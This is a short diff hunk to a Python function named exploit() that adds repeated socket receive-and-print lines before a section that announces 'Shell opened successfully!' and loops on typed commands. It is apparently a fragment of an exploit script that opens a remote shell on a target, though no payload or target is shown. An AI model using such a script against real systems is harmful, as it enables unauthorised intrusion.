@@ -44,7 +44,12 @@ def exploit():
     try:
         response = s.recv(1024)
         print(f"Response: {response}")
-        
+        response = s.recv(1024)
+        print(f"Response: {response}")
+        response = s.recv(1024)
+        print(f"Response: {response}")
+        response = s.recv(1024)
+        print(f"Response: {response}")
         # Keep the shell open
         print("Shell opened successfully! Type commands:")
         while True:
